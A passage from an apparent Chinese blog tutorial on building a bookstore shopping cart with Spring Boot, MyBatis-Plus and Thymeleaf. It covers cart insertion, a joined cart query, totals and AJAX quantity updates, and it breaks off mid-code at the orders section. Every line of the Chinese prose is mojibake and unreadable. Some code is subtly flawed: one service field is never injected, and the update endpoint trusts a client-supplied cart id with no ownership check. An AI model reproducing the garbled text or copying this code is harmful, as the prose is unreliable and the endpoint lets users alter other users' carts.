src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522192955454.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522192955454.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯è¿™æ ·å†™æœ‰ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡éƒ½æ˜¯save()ä¿å­˜ä¸€æ¡æ–°æ•°æ®ã€‚</p><p>æ­£ç¡®çš„é€»è¾‘åº”è¯¥æ˜¯ï¼šå¦‚æœuser_idå’Œbook_idä¸€æ ·ï¼Œå°±å¯¹countåšåŠ ï¼Œå¦‚æœä¸ä¸€æ ·å†å†™å…¥ä¸€æ¡æ–°æ•°æ®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">add</span><span class="params">(Cart cart, HttpSession session)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    cart.setUserId(user.getId());</span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ˜¯å¦å·²ç»åœ¨è´­ç‰©è½¦å­˜åœ¨è¯¥è®°å½•</span></span><br><span class="line">    QueryWrapper&lt;Cart&gt; cartQueryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    cartQueryWrapper.eq(<span class="string">&quot;user_id&quot;</span>,user.getId());</span><br><span class="line">    cartQueryWrapper.eq(<span class="string">&quot;book_id&quot;</span>,cart.getBookId());</span><br><span class="line">    <span class="type">Cart</span> <span class="variable">queryCart</span> <span class="operator">=</span> cartService.getOne(cartQueryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(queryCart == <span class="literal">null</span>)&#123;</span><br><span class="line">        cartService.save(cart);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        queryCart.setCount(queryCart.getCount() + cart.getCount());</span><br><span class="line">        cartService.updateById(queryCart);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡getOneæŸ¥è¯¢æ˜¯å¦æœ‰ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼ŒsetCountæ›´æ”¹countå€¼ï¼ŒupdateByIdæ›´æ–°è‡³è¡¨</p><p>è¿™æ ·å†æ·»åŠ ä¸€æœ¬ï¼Œcountå°±ç›´æ¥å˜ä¸º2ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193659491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522193659491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="è´­ç‰©è½¦åˆ—è¡¨æ˜¾ç¤ºé¡µé¢"><a href="#è´­ç‰©è½¦åˆ—è¡¨æ˜¾ç¤ºé¡µé¢" class="headerlink" title="è´­ç‰©è½¦åˆ—è¡¨æ˜¾ç¤ºé¡µé¢"></a>è´­ç‰©è½¦åˆ—è¡¨æ˜¾ç¤ºé¡µé¢</h3><ul><li>æ•°æ®åº“å…³è”</li></ul><p>åŠ å…¥åˆ°è´­ç‰©è½¦åªä½¿ç”¨äº†book_idï¼Œä½†æ˜¯è´­ç‰©è½¦çš„ä¿¡æ¯å±•ç¤ºä¸€å®šéœ€è¦ç”¨åˆ°å›¾ä¹¦åï¼Œä»·æ ¼ç­‰ï¼Œæ‰€ä»¥éœ€è¦åšæ•°æ®è¡¨çš„å…³è”</p><p>åœ¨Cartå®ä½“ç±»ä¸­ï¼Œå…³è”Bookæ•°æ®åº“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Book book;</span><br></pre></td></tr></table></figure><p>å¦‚æœåªæ˜¯åƒä¸Šé¢é‚£æ ·åœ¨Cart.javaä¸‹å®šä¹‰ä¸€éBookï¼Œåœ¨ç”¨mybatis-plusè¿›è¡ŒæŸ¥è¯¢å°è£…ç»“æœé›†çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºæ²¡æœ‰Bookç±»çš„å­—æ®µ</p><p>è¿™é‡Œç”¨@TableFieldæ³¨è§£ï¼Œè¡¨æ˜Cartæ˜¯ä¸å’ŒBookæ•°æ®åº“ä¸­çš„åˆ—è¿›è¡Œæ˜ å°„çš„ï¼Œåªæ˜¯ä½œä¸ºç»“æœé›†çš„å­˜æ”¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å±è”½æ•°æ®åº“ä¸­è¯¥è¡¨å’ŒBookè¡¨çš„æ˜ å°„</span></span><br><span class="line"><span class="meta">@TableField(exist=false)</span></span><br><span class="line"><span class="keyword">private</span> Book book;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±åšå¥½å…³è”äº†</p><ul><li>æŸ¥è¯¢å½“å‰ç”¨æˆ·è´­ç‰©è½¦</li></ul><p>è¿™ç§å…³è”æ•°æ®åº“çš„æŸ¥è¯¢mybatiså¹¶æ²¡æœ‰æä¾›å¯¹åº”çš„æ–¹æ³•ï¼Œåªèƒ½æ‰‹æ•²sqlè¯­å¥äº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> bs_cart bsc <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> bs_book bsb <span class="keyword">ON</span> bsc.book_id <span class="operator">=</span> bsb.id;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šä¸»è¡¨ä¸ºbs_cartï¼Œå¹¶æ”¹åˆ«åä¸ºbscã€‚ä½¿ç”¨LEFT JOINæŠŠä¸»è¡¨(bs_cart)å’Œbs_bookè¿æ¥ï¼Œå¹¶ç”¨bsbä½œä¸ºè¡¨åˆ«åï¼Œè¿æ¥æ¡ä»¶æ˜¯bs_cart.book_id&#x3D;bs_book.id</p><p>è¯¥å¥sqlè¯­å¥çš„ä½œç”¨ä¸ºï¼ŒæŸ¥è¯¢bs_cartå’Œbs_bookæŒ‰idå…³è”èµ·æ¥çš„è¡¨çš„æ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522200303848.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522200303848.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŠ ä¸Šé™å®š<code>where user_id =</code>ï¼Œèµ·åˆ°æŸ¥è¯¢ç”¨æˆ·è´­ç‰©è½¦çš„ä½œç”¨</p><p>å½“ç„¶ï¼Œ*å¯ä»¥æ¢æ‰ï¼Œåº”ä¸ºä¸æ˜¯å…¨éƒ¨å›¾ä¹¦ä¿¡æ¯éƒ½è¦åœ¨è´­ç‰©è½¦é¡µé¢åšå±•ç¤ºï¼Œä»…éœ€è¦bs_bookçš„book_name,imgUrl,newPriceå’Œbs_cartå…¨éƒ¨ä¿¡æ¯</p><p>é‡æ–°å»ºä¸€ä¸ªå®ä½“ç±»CartVoæ¥å‚¨å­˜å…³è”åçš„æ•°æ®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartVo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line">    <span class="keyword">private</span> Integer bookId;</span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line">    <span class="keyword">private</span> String bookName;</span><br><span class="line">    <span class="keyword">private</span> String imgUrl;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> newPrice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨CartMapperåšå…³è”æŸ¥è¯¢çš„å®ç°ï¼š</p><p>åœ¨mybatisä¸­ï¼Œåªéœ€è¦ç”¨@select()æ³¨è§£è¡¨æ˜æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œå°±èƒ½æŒ‡æ˜æ–¹æ³•è¦æ‰§è¡Œçš„sqlè¯­å¥ã€‚ç”¨List&lt;CartVo&gt;æ¥å­˜å‚¨ç»“æœé›†</p><p>#{userId}å˜é‡ï¼Œé¢„ç¼–è¯‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;SELECT\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsc.*, bsb.NAME AS bookName, bsb.img_url AS img_url,\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsb.new_price AS new_price\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;FROM\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbs_cart bsc\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;LEFT JOIN bs_book bsb ON bsc.book_id = bsb.id\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;WHERE\n&quot; +</span></span><br><span class="line"><span class="meta">            &quot;\tbsc.user_id = #&#123;userId&#125;&quot;)</span></span><br><span class="line">    List&lt;CartVo&gt; <span class="title function_">findCartListByUserId</span><span class="params">(Integer userId)</span>;</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæµ‹è¯•æ–¹æ³•æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><p>åœ¨AnzfloorApplicationTesté‡Œæ–°å»ºä¸€ä¸ªæµ‹è¯•ï¼Œçœ‹ä¸‹èƒ½å¦åœ¨é¡¹ç›®ä¸­æŸ¥è¯¢åˆ°å…³è”åçš„æ•°æ®ï¼Œå› ä¸ºä¹‹å‰æ˜¯ç”¨userid&#x3D;6æ·»åŠ çš„è´­ç‰©è½¦ï¼ŒæŸ¥è¯¢ä¹Ÿç”¨6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> CartMapper cartMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findCartList</span><span class="params">()</span> &#123;cartMapper.findCartListByUserId(<span class="number">6</span>).forEach(System.out::println);&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œçš„å¾ˆå®Œç¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523110223352.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523110223352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Serviceå±‚è°ƒç”¨ä¸€émapper.findCartByUserId:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;CartMapper, Cart&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> CartMapper cartMapper;</span><br><span class="line">    <span class="keyword">public</span> List&lt;CartVo&gt; <span class="title function_">findCartByUser</span><span class="params">(Integer userId)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cartMapper.findCartListByUserId(userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ControlleræŠŠæŸ¥è¯¢å‡ºçš„æ•°æ®å°è£…è¿›model</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;CartVo&gt; cartVos = cartService.findCartByUser(user.getId());</span><br><span class="line">model.addAttribute(<span class="string">&quot;cartList&quot;</span>,cartVos);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130516343.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130516343.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‘è´­ç‰©è½¦é‡Œæ–°åŠ ä¸€æœ¬ä¸åŒçš„ä¹¦ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130551928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130551928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ–°åŠ ä¸€æœ¬ç›¸åŒçš„ä¹¦ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130633873.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230523130633873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="è®¡ç®—æ€»é‡‘é¢"><a href="#è®¡ç®—æ€»é‡‘é¢" class="headerlink" title="è®¡ç®—æ€»é‡‘é¢"></a>è®¡ç®—æ€»é‡‘é¢</h3><p>CartServiceä¸‹å®šä¹‰ä¸€ä¸ªè®¡ç®—æ€»é‡‘é¢çš„æ–¹æ³•ï¼Œé€»è¾‘å¾ˆç®€å•ï¼Œä¹¦çš„é‡‘é¢ä¹˜ä»¥æ•°é‡çš„æ€»å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getCartItemTotal</span><span class="params">(List&lt;CartVo&gt; list)</span>&#123;</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(CartVo cart:list)&#123;</span><br><span class="line">        sum += cart.getCount() * cart.getNewPrice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¯¥æ–¹æ³•ç„¶åå†™å…¥åˆ°session</p><p>å‰ç«¯æ˜¾ç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;text-success cartPrice&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;session.userCartInfo.totalPrice&#125;&quot;</span>&gt;</span>345<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æ•°é‡æ çš„å®ç°ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529211316871.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529211316871.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-default&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;minus([[$&#123;cart.id&#125;]],[[$&#123;cart.newPrice&#125;]],[[$&#123;iter.index&#125;]])&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">th:id</span>=<span class="string">&quot;$&#123;&#x27;cartCount&#x27; + iter.index&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&#x27;form-control&#x27;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;cart.count&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-default&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;plus([[$&#123;cart.id&#125;]],[[$&#123;cart.newPrice&#125;]],[[$&#123;iter.index&#125;]])&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç‚¹å‡»å·¦è¾¹è§¦å‘minuså‡½æ•°ï¼Œç‚¹å‡»å³è¾¹è§¦å‘pluså‡½æ•°ï¼Œä¸­é—´æ˜¾ç¤ºå½“å‰è¯¥ä¹¦çš„æ•°é‡ã€‚minuså’Œpluséœ€è¦å®ç°å¼‚æ­¥ä¿®æ”¹æ•°æ®åº“çš„è®°å½•ï¼ˆæ ¹æ®cart.idï¼‰</p><p>è¿™é‡Œçš„iteræ˜¯åœ¨è¿›è¡Œå¾ªç¯å¯¹è±¡è¾“å‡ºæ—¶å®šä¹‰çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr <span class="attr">th</span>:each=<span class="string">&quot;cart,iter:$&#123;cartList&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ¯æ¬¡å¾ªç¯å¯¹åº”çš„é¡¹çš„idéƒ½ä¸åŒï¼Œè¿˜æ˜¯è¿™å¼ å›¾ï¼Œåºå·ä¸º1å¯¹åº”çš„æ•°é‡3å’Œåºå·ä¸º2å¯¹åº”çš„æ•°é‡1æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯éƒ½æ˜¯ç”¨th:eachè¾“å‡ºçš„ï¼Œä¸ºäº†è¡¨ç¤ºä¸åŒï¼Œä½¿ç”¨<code>th:id=&quot;$&#123;&#39;cartCount&#39; + iter.index&#125;&quot;</code>æ ¹æ®å¾ªç¯çš„ä¸åŒæ‹¼æ¥å‡ºçš„idä¹Ÿä¸åŒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230529204707259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­<code>$(&quot;#cartCount&quot;+index).val()</code>æ„æ€ä¸ºå–<code>&lt;input type=&#39;text&#39; th:id=&quot;$&#123;&#39;cartCount&#39; + iter.index&#125;&quot; class=&#39;form-control&#39; th:value=&quot;$&#123;cart.count&#125;&quot;&gt;</code>çš„valueï¼Œä¹Ÿå°±æ˜¯å½“å‰è¿™æ¡æ•°æ®çš„æ•°é‡ã€‚æ¯”å¦‚ç¬¬ä¸€æ¡åŒ—çº¬78Â°ï¼Œ<code>$(&quot;#cartCount&quot;+index)</code>å°±æŒ‡ä»£äº†id&#x3D;..è¿™ä¸ªçš„divï¼Œval()æ˜¯å–å€¼</p><p>minusçš„å®ç°:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">minus</span>(<span class="params">cartId,price,index</span>) &#123;</span><br><span class="line">    <span class="comment">//æ•°é‡å‡ä¸€</span></span><br><span class="line">   <span class="keyword">var</span> count = <span class="built_in">parseInt</span>($(<span class="string">&quot;#cartCount&quot;</span>+index).<span class="title function_">val</span>());</span><br><span class="line">   <span class="keyword">var</span> _price = <span class="built_in">parseFloat</span>(price);</span><br><span class="line">   <span class="keyword">if</span> (count != <span class="number">1</span>)&#123;</span><br><span class="line">                 $(<span class="string">&quot;#cartCount&quot;</span>+index).<span class="title function_">val</span>(count - <span class="number">1</span>);</span><br><span class="line">                 $(<span class="string">&quot;#cartPrice&quot;</span> + index).<span class="title function_">html</span>((count - <span class="number">1</span>) * _price);</span><br><span class="line">      <span class="title function_">updateCart</span>(cartId,count - <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>é¡µé¢ä¸Šè·å–çš„priceæ˜¯ä»¥å­—ç¬¦ä¸²å½¢å¼å“åº”çš„ï¼Œè¦ç”¨parseFloatå¤„ç†</p><p>updateCart:postå‘é€cartIdå’Œcount</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateCart</span>(<span class="params">cartId,count</span>) &#123;</span><br><span class="line">             $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">                 <span class="attr">url</span>: contextPath + <span class="string">&quot;/cart/update&quot;</span>,</span><br><span class="line">                 <span class="attr">data</span>:&#123;<span class="string">&quot;id&quot;</span>:cartId,<span class="string">&quot;count&quot;</span>:count&#125;,</span><br><span class="line">                 <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">                 <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">         $(<span class="string">&quot;#total&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;æ€»ä»·&#x27;</span> + data + <span class="string">&#x27;å…ƒ&#x27;</span>);</span><br><span class="line">         $(<span class="string">&quot;.cartPrice&quot;</span>).<span class="title function_">html</span>(data);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;)</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>åœ¨åç«¯:<br>å®ƒæ¥å—ä¸€ä¸ªåä¸ºâ€cartâ€çš„è´­ç‰©è½¦å¯¹è±¡ï¼Œå¹¶å°†å…¶æ›´æ–°åˆ°æ•°æ®åº“ä¸­ã€‚ç„¶åï¼Œä»ä¼šè¯ä¸­è·å–ç”¨æˆ·å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨è¯¥ç”¨æˆ·çš„IDæŸ¥è¯¢è¯¥ç”¨æˆ·çš„è´­ç‰©è½¦åˆ—è¡¨ã€‚ç„¶åï¼Œè®¡ç®—è´­ç‰©è½¦é¡¹ç›®çš„æ€»ä»·å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/update&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">update</span><span class="params">(HttpSession session,Cart cart)</span>&#123;</span><br><span class="line">    cartService.updateById(cart);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    List&lt;CartVo&gt; cartVos = cartService.findCartByUser(user.getId());</span><br><span class="line">    <span class="comment">//ç”¨æˆ·è´­ç‰©è½¦ä¿¡æ¯å­˜æ”¾åˆ°sessionä¸­</span></span><br><span class="line">    <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cartService.getCartItemTotal(cartVos);</span><br><span class="line">    <span class="keyword">return</span> String.valueOf(price);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç†è¯´updateä¸­è¦å¯¹sessionåŠæ—¶çš„æ›´æ–°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”¨æˆ·è´­ç‰©è½¦ä¿¡æ¯å­˜æ”¾åˆ°sessionä¸­</span></span><br><span class="line"><span class="type">UserCartVo</span> <span class="variable">userCartVo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserCartVo</span>();</span><br><span class="line">userCartVo.setNum(cartVos.size());</span><br><span class="line">userCartVo.setTotalPrice(cartService.getCartItemTotal(cartVos));</span><br><span class="line">session.setAttribute(<span class="string">&quot;userCartInfo&quot;</span>,userCartVo);</span><br><span class="line">model.addAttribute(<span class="string">&quot;cartList&quot;</span>,cartVos);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸æ›´æ–°ä¹Ÿè¡Œï¼Œå› ä¸ºæ¯æ¬¡å‰ç«¯éƒ½ä»æ•°æ®åº“è¯»çš„æ•°æ®ï¼Œè€Œæ•°æ®åº“å·²ç»åŠæ—¶æ›´æ–°äº†ã€‚åŠ ä¸Šä¹Ÿè¡Œï¼Œæ²¡åŒºåˆ«</p><p>è‡³äºè´­ç‰©è½¦çš„åˆ é™¤ï¼Œæ— å¼‚äºæ›´æ–°ï¼Œåªæ˜¯å‰ç«¯è¦è¿›è¡Œæ ¹æ®æ¯é¡¹checkboxçš„idè¿›è¡Œç§»é™¤ï¼Œæ­¤å¤„çœç•¥</p><h2 id="æˆ‘çš„è®¢å•"><a href="#æˆ‘çš„è®¢å•" class="headerlink" title="æˆ‘çš„è®¢å•"></a>æˆ‘çš„è®¢å•</h2><p>å†…å®¹ä¸æˆ‘çš„è´­ç‰©è½¦å¤§è‡´ä¸€è‡´ï¼Œé‡å¤çš„å†…å®¹å°±ä¸å†™äº†ï¼Œä¸»è¦å°±æ˜¯å®ç°ç»“ç®—å•†å“åŠŸèƒ½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230602202329936.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230602202329936.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ ¹æ®user_idå’Œbook_idæŸ¥è¯¢è®°å½•</p><p>è¿™æ˜¯ä¸€ä¸ªæ–¹æ³•ç­¾åï¼Œå…¶ä½œç”¨æ˜¯æ ¹æ®ä¼ å…¥çš„  <code>ids</code>  åˆ—è¡¨ï¼Œè¿”å›ä¸€ä¸ª  <code>CartVo</code>  ç±»å‹çš„å¯¹è±¡åˆ—è¡¨ã€‚ <code>@Param</code>  æ³¨è§£ç”¨äºæŒ‡å®šä¼ å…¥å‡½æ•°çš„å‚æ•°åç§°ï¼Œè¿™é‡Œçš„å‚æ•°åç§°æ˜¯  <code>ids</code> ã€‚è¯¥å‡½æ•°å¯èƒ½ç”¨äºæ ¹æ®ä¼ å…¥çš„ ID åˆ—è¡¨æŸ¥æ‰¾  <code>CartVo</code>  å¯¹è±¡åˆ—è¡¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 